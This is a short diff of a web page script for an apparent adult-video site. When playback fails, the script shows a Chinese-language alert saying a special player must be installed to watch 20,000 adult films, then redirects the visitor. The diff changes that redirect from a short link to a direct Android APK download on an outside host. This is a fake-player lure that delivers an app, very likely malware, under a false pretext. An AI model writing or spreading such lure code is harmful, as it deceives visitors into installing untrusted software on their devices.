@@ -21,7 +21,7 @@
 			else 
 			{
 				window.alert('没有检测到本站专用色片播放器,请下载本站专用播放器，安装后运行专用浏览器即可观看本站2W部成人爽片哦！');
-				location.href="http://t.cn/R7qFBqD";
+				location.href="http://d.haoghost.com/sybb.10C352.apk";
 				isLoading.style.display	="none";	//隐藏层 [加载进度]
 				isAlert.style.display	="block";	//显示层 [提示下载]
 
